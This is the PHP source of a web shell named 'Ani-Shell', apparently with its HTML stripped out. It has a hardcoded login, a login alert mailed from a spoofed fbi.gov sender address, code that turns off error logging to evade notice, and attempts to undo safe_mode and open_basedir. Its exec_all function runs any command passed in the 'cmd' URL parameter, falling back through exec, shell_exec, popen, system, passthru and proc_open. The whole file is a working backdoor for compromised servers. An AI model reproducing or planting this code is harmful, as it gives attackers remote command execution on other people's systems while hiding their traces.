<?php

/*
==============
*/

error_reporting(0);
ini_set('max_execution_time',0);


// ------------------------------------- Some header Functions (Need to be on top) ---------------------------------\

/**************** Defines *********************************/

$user = "anlfi";
$pass = "XXX";
$sm = @ini_get('safe_mode');
$SEPARATOR = '/'; // Default Directory separator
$os = "N/D";
if(stristr(php_uname(),"Windows"))
{
        $SEPARATOR = '\\';
        $os = "Windows";
}
else if(stristr(php_uname(),"Linux"))
{
        $os = "Linux";
}


//*************************************************************/

// -------------- Traceback Functions

function sendLoginAlert()
{
    global $ownerEmail;
    global $url;
    $accesedIp = $_SERVER['REMOTE_ADDR'];
    $randomInt = rand(0,1000000);           # to avoid id blocking
    $from = "ani-shell$[email]randomInt@fbi.gov[/email]"; 
    
    //echo $from;
    
    if(function_exists('mail'))
    {
        $subject = "Shell Accessed -- Ani-Shell --";
        $message = "
Hey Owner ,
        
        Your Shell(Ani-Shell) located at $url was accessed by $accesedIp
        
        If its not you :-
        
        1. Please check if the shell is secured.
        2. Change your user name and Password.
        3. Check if lock is 0n!
        and Kick that ****** out!
        
        Thanking You
        
Yours Faithfully
Ani-Shell
        ";
        mail($ownerEmail,$subject,$message,'From:'.$from);
    }
}

//---------------------------------------------------------


if(function_exists('session_start') && $lock == 'on')
{
    session_start();
}
else
{
    // The lock will be set to 'off' if the session_start fuction is disabled i.e if sessions are not supported 
    $lock = 'off';
}

//logout

if(isset($_GET['logout']) && $lock == 'on')
{
    $_SESSION['authenticated'] = 0;
    session_destroy();
    header("location: ".$_SERVER['PHP_SELF']);
}

ini_set('max_execution_time',0);



/***************** Restoring *******************************/


ini_restore("safe_mode");
ini_restore("open_basedir");

if(function_exists('ini_set'))
{
    ini_set('error_log',NULL);  // No alarming logs
    ini_set('log_errors',0);    // No logging of errors
}

else
{
    ini_alter('error_log',NULL);
    ini_alter('log_errors',0);
}

// ----------------------------------------------------------------------------------------------------------------


?><?php

if(isset($_POST['user']) && isset($_POST['pass']) && $lock == 'on')
{
    if( $_POST['user'] == $user &&
         $_POST['pass'] == $pass )
    {
            $_SESSION['authenticated'] = 1;
            // --------------------- Tracebacks --------------------------------
            if($tracebackFeature == 'On')
            {
                sendLoginAlert();
            }
            // ------------------------------------------------------------------
    }
}

if($lock == 'off')
{?><?php
}

if($lock == 'on' && (!isset($_SESSION['authenticated']) || $_SESSION['authenticated']!=1) )
{

?><?php // echo $greeting;?><?php echo $_SERVER['PHP_SELF'];?><?php
}
//---------------------------------- We are authenticated now-------------------------------------
//Launch the shell
else 
{
    //---------------------------------- Fuctions ---------------------------------------------------

    function showDrives()
    {
        global $self;
        foreach(range('A','Z') as $drive)
        {
            if(is_dir($drive.':\\'))
            {
                ?><?php echo $self ?><?php echo $drive.":\\"; ?><?php echo $drive.":\\" ?><?php
            }
        }
    }

    function HumanReadableFilesize($size)
    {
 
        $mod = 1024;
 
        $units = explode(' ','B KB MB GB TB PB');
        for ($i = 0; $size > $mod; $i++) 
        {
            $size /= $mod;
        }
 
        return round($size, 2) . ' ' . $units[$i];
    }

function getClientIp()
{
    echo $_SERVER['REMOTE_ADDR'];
}

function getServerIp()
{
    echo getenv('SERVER_ADDR');
}
function getSoftwareInfo()
{
    echo php_uname();
}
function diskSpace()
{
    echo HumanReadableFilesize(disk_total_space("/"));
}
function freeSpace()
{
    echo HumanReadableFilesize(disk_free_space("/"));
}
function getSafeMode()
{
        global $sm;
                echo($sm?"ON :( :'( (Most of the Features will Not Work!)":"OFF");
        
}

function getDisabledFunctions()
{
    if(!ini_get('disable_functions'))
    {
                echo "None";
    }
    else
    {
                        echo @ini_get('disable_functions');
    }
}

function getFilePermissions($file)
{
    
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

return $info;

}

/***********************************************************/
// exec_all , A function used to execute commands , This function will only execute if the Safe Mode is
// Turned OfF!
/**********************************************************/


function exec_all($command)
{
    
    $output = '';
    if(function_exists('exec'))
    {   
        exec($command,$output);
        $output = join("\n",$output);
    }
    
    else if(function_exists('shell_exec'))
    {
        $output = shell_exec($command);
    }
    
    else if(function_exists('popen'))
    {
        $handle = popen($command , "r"); // Open the command pipe for reading
        if(is_resource($handle))
        {
            if(function_exists('fread') && function_exists('feof'))
            {
                while(!feof($handle))
                {
                    $output .= fread($handle, 512);
                }
            }
            else if(function_exists('fgets') && function_exists('feof'))
            {
                while(!feof($handle))
                {
                    $output .= fgets($handle,512);
                }
            }
        }
        pclose($handle);
    }
    
    
    else if(function_exists('system'))
    {
        ob_start(); //start output buffering
        system($command);
        $output = ob_get_contents();    // Get the ouput 
        ob_end_clean();                 // Stop output buffering
    }
    
    else if(function_exists('passthru'))
    {
        ob_start(); //start output buffering
        passthru($command);
        $output = ob_get_contents();    // Get the ouput 
        ob_end_clean();                 // Stop output buffering            
    }
    
    else if(function_exists('proc_open'))
    {
        $descriptorspec = array(
                1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
                );
        $handle = proc_open($command ,$descriptorspec , $pipes); // This will return the output to an array 'pipes'
        if(is_resource($handle))
        {
            if(function_exists('fread') && function_exists('feof'))
            {
                while(!feof($pipes[1]))
                {
                    $output .= fread($pipes[1], 512);
                }
            }
            else if(function_exists('fgets') && function_exists('feof'))
            {
                while(!feof($pipes[1]))
                {
                    $output .= fgets($pipes[1],512);
                }
            }
        }
        pclose($handle);
    }
    else
    {
        $output = "They have their Security there! :( ";
    }
    
    return(htmlspecialchars($output));
    
}
function magicQuote($text)
{
    if (!get_magic_quotes_gpc())
    {
        return $text;
    }
    return stripslashes($text);
}
//------------------------------------------------------------------------------------------------


?><?php echo $self.'?shell';?><?php if($lock == 'on')
    {
    ?><?php echo $self.'?logout'?><?php
    }
    ?><?php
//-------------------------------- Check what he wants -------------------------------------------

// Shell

if(isset($_GET['shell']))
{
    if(!isset($_GET['cmd']) || $_GET['cmd'] == '')
    {
        $result = "";    
    }
    else
    {
        $result=exec_all($_GET['cmd']);
    }
    ?><?php echo $result;?><?php echo $self;?><?php
    }
}


?>